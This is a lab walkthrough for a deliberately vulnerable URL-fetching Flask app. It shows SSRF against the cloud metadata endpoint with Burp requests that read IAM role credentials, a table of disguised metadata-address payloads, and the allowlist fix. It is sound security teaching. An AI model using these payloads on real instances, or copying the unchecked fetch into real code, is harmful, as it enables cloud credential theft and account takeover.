# Walkthrough — ssrf-cloud-metadata

You are going to make the server fetch the one URL that exists on every cloud instance and pays more than any internal dashboard: the metadata endpoint at `169.254.169.254`. An unauthenticated `GET` there returns the instance's IAM credentials, and this app hands you the response body. In `ssrf-basic` you pointed the server at a generic internal service and read it; here it is the **same primitive** — fetch and show — aimed at the crown jewel. By the end you will have the instance's `AccessKeyId`, `SecretAccessKey`, and session `Token` in your Repeater response pane.

There is one actor in this atom: you, the pentester. The primary track is Burp Repeater; the browser is a low-friction secondary track.

## 1. Context

The app is a "Fetch from URL" tool. On `/` there is a form with a URL field; submitting it sends `POST /fetch`, and the server fetches that URL with the `requests` library and renders the response body back to you inside a `<pre>` block. The default value is `https://api.github.com/zen`, a real public endpoint that returns one short line of text — good for confirming the feature works before you make the URL interesting.

This is **A10 — Server-Side Request Forgery (SSRF)**, aimed at the cloud metadata endpoint.

## 2. About this lab's environment

Three containers come up together (see [`docker-compose.yml`](./docker-compose.yml)):

- `vulnerable` (published on `127.0.0.1:8017`) and `fixed` (`127.0.0.1:8117`) — the Fetch-from-URL app, broken and patched.
- `metadata-mock` — a fake IMDS answering at the **real link-local IP `169.254.169.254`**, the exact address the metadata service uses on a real AWS/GCP/Azure instance. The credentials it returns are AWS's documented `…EXAMPLE` placeholders — **obviously fake**. It is **not** published to the host (no `ports:` entry), so `curl http://169.254.169.254/` from your laptop will not reach it; only the app, sitting inside the Docker network, can.

In a real engagement, `169.254.169.254` is the instance's own metadata service. It is link-local, unauthenticated, and present on every AWS/GCP/Azure VM **by design** — that is how an instance learns its own configuration and its IAM role credentials. Nothing about it is misconfigured. The bug is entirely in an app that will fetch a URL an attacker chose.

`vulnerable` and `fixed` share **one** Docker network with `metadata-mock` here (the mock is pinned at a fixed IP, which can only live in one subnet). Both apps can reach the mock at the network layer — which is what makes the fixed app's later refusal its **application code**, not the network.

## 3. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `/fetch` view is short:

```python
@app.route("/fetch", methods=["POST"])
def fetch():
    url = request.form.get("url", "")
    # VULNERABLE: fetch an attacker-controlled URL and return the response body verbatim.
    try:
        r = requests.get(url, timeout=5)
        body, status = r.text, r.status_code
    except requests.RequestException as exc:
        body, status = f"Request error: {exc}", None
    return render_template("result.html", url=url, body=body, status=status)
```

The form value `url` flows straight into `requests.get(url, ...)`. There is no parsing, no allowlist, no scheme check, no host check. Whatever URL you send, the server fetches — and hands you the body. This is the same shape as `ssrf-basic`; the move in this atom is *which* URL you aim it at.

> One property of SSRF matters for what follows: the outbound request comes from the **server**, not from you. It carries the server's network position and whatever identity the server implicitly holds. On a cloud instance, that identity is an IAM role — and the metadata service will hand the role's credentials to anything on the instance that asks. The SSRF lets you be that "anything".

## 4. Exploitation via Burp Suite (primary track)

Configure Burp Proxy and point your browser at it. Visit <http://127.0.0.1:8017/>, submit the form once with the default URL to capture the traffic, then right-click the `POST /fetch` request in **Proxy → HTTP history** and choose **Send to Repeater**. The body is `url=<your URL>`; when you edit it, Burp recomputes `Content-Length` for you. (Unencoded `:` and `/` inside the form value are fine — Flask decodes the value as-is — so you can type the URL readably.)

### Step 1 — Confirm the feature works

Request in Repeater:

```
POST /fetch HTTP/1.1
Host: 127.0.0.1:8017
Content-Type: application/x-www-form-urlencoded

url=https://api.github.com/zen
```

Response: status `200`; the `<pre>` block holds a single short line, e.g. `Anything added dilutes everything else.` (the quote varies per request). This is your baseline — the legitimate use of the feature. Note the quiet mechanic: **Burp shows the response as if your browser fetched `api.github.com`, but it didn't. The server did, and forwarded the body back to you.** (This step needs internet egress; if the lab is offline you'll get a `Request error` instead — jump to Step 2, which targets the internal mock and needs no egress.)

### Step 2 — Recon: ask the metadata endpoint for the role name

Change the body to the metadata endpoint's credentials directory:

```
POST /fetch HTTP/1.1
Host: 127.0.0.1:8017
Content-Type: application/x-www-form-urlencoded

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Response: status `200`; the `<pre>` block holds:

```
app-instance-role
```

That is the name of the IAM role attached to the instance. The metadata service told you, unauthenticated, over plain HTTP, through the app. `169.254.169.254` is a host your laptop cannot meaningfully reach, but the app's container sits one hop closer — exactly the asymmetry SSRF exploits.

### Step 3 — Loot: read the role's credentials

Append the role name to the path:

```
POST /fetch HTTP/1.1
Host: 127.0.0.1:8017
Content-Type: application/x-www-form-urlencoded

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-instance-role
```

Response: status `200`; the `<pre>` block holds the credentials JSON:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-07-23T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEXAMPLEtokenEXAMPLEtokenEXAMPLEtokenEXAMPLE=",
  "Expiration": "2026-07-23T06:00:00Z"
}
```

You now hold the instance's IAM session credentials. The `AccessKeyId` starts with `ASIA`, which marks **temporary** (STS) credentials — the kind the metadata service hands out for an instance role. On a real target these would be live: an attacker sets them as `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` / `AWS_SESSION_TOKEN` and calls the AWS API as the instance's role. That step — *using* the credentials — is post-exploitation and out of scope for this atom; the finding is the theft itself, via SSRF.

> In Burp's raw response the JSON is HTML-escaped in the page source (`"` appears as `&#34;`) because the app autoescapes the body it echoes; Burp's rendered view shows the real characters. The escaping is deliberate — it keeps this atom to one vulnerability (SSRF) instead of accidentally adding an XSS. See [`DIFF.md`](./DIFF.md).

### What you've just demonstrated, in one sentence

A request that looks, at the ingress layer, like `POST /fetch` with a URL in the body caused the server to read its own cloud credentials and hand them to you. Nothing in the request was "malicious" in the SQLi/XSS sense — the whole exploit lives in *which URL* the server agreed to fetch.

## 5. What this vulnerability is NOT

This exploit is legitimate-looking input — a URL — so it is easy to mislearn. Pin down what the bug is not:

- **It is NOT a misconfiguration of the metadata service or of AWS.** `169.254.169.254` is link-local, unauthenticated, and present on every cloud instance *by design* — that is how instance identity works. There is nothing to "fix" on the cloud side to make this specific bug go away. The flaw is 100% the app that fetches an attacker-chosen URL. If you walk away thinking "the cloud exposes the metadata endpoint" is the vulnerability, you've mislearned it.
- **It is NOT remote code execution on the app server.** You did not run code on the app; you made it fetch a URL. The finding is credential theft via SSRF. (Those credentials may unlock a great deal *inside the cloud account*, but that is escalation with a stolen key, not RCE on this app.)
- **It is NOT "you authenticated as the attacker."** The credentials belong to the **instance's IAM role**. You get them because the server carried the request to the metadata endpoint for you — the request came from the server, with the server's network position and identity. You **inherit the instance's identity**; you do not forge your own.
- **What it IS:** the server fetches a destination *you choose* (`http://169.254.169.254/…`) and hands you the body — which happens to be a credential. The only fix is to **validate the destination** (the fixed app: a deny-by-default allowlist → `403`) — not to hope nobody points at the metadata endpoint, and not to blocklist just the link-local range.

## 6. Impact

**IAM credential theft → cloud account takeover.** An attacker reads live instance-role credentials from the metadata service via SSRF and then acts as that role in the cloud account — doing whatever the role's policy permits (reading S3 buckets, enumerating the account, and so on). This is one of the highest-impact SSRF outcomes in the real world; the 2019 Capital One breach followed exactly this shape — SSRF → metadata endpoint → IAM credentials → data in S3. It is **not** RCE on the application server itself, and *using* the credentials is post-exploitation, out of scope here; this atom ends at the theft.

## 7. Exploitation via browser (secondary track, optional)

You can drive the whole thing from the form. Open <http://127.0.0.1:8017/>, replace the URL with `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, and click **Fetch** — the role name renders in the `<pre>`. Then append the role name (`.../app-instance-role`) and fetch again to see the credentials. It is the gentlest first pass; switch to Burp Repeater for real iteration — raw control of the body, faster edits, and the raw response bytes.

## 8. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. In short, the fixed `/fetch` view parses the URL with `urllib.parse.urlparse` and rejects anything whose scheme isn't `http`/`https` or whose host isn't in a small allowlist:

```python
parsed = urlparse(url)
if parsed.scheme not in ("http", "https") or parsed.hostname not in ALLOWED_HOSTS:
    abort(403)
```

Replay the payloads against <http://127.0.0.1:8117/fetch>:

- Step 2 (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`): **403 Forbidden**.
- Step 3 (`.../app-instance-role`): **403 Forbidden** — no role name, no credentials.
- Step 1 (`https://api.github.com/zen`): still **200**, the body returned as before — the allowlist is a *positive* list, so vetted use keeps working.

Contrast with the vulnerable app: there the credentials come back in the body; here the same request is refused with a visible `403` and nothing comes back. Because this atom is **in-band**, the difference shows up right in the response — unlike a blind SSRF, where you would confirm the block out-of-band.

The refusal is the application code, not the network. The `metadata-mock` is still reachable from the `fixed` container at the network layer (a request made from *inside* the container, bypassing the app, still hits `169.254.169.254`); the app simply refuses to make it.

And the fix is robust, not a bypassable blocklist. It decides on `urlparse(...).hostname` — the host the HTTP client will actually connect to — so every disguised form of the metadata address is rejected too:

| Payload (body `url=`) | Parsed host | Result |
|---|---|---|
| `http://2852039166/…` (decimal) | `2852039166` | **403** |
| `http://0xa9fea9fe/…` (hex) | `0xa9fea9fe` | **403** |
| `http://[::ffff:169.254.169.254]/…` | `::ffff:169.254.169.254` | **403** |
| `http://api.github.com@169.254.169.254/…` (userinfo) | `169.254.169.254` | **403** |

The last row is the important one: `api.github.com` appears in the string, so a naive `if "api.github.com" in url` test would pass it and let the request reach the metadata endpoint. Parsing first and comparing `hostname` defeats it. See [`DIFF.md`](./DIFF.md) for why an allowlist beats a link-local blocklist, and for **IMDSv2** — the cloud-side hardening (a required `PUT` token, `hop-limit=1`) that a real instance adds on top of the application fix.
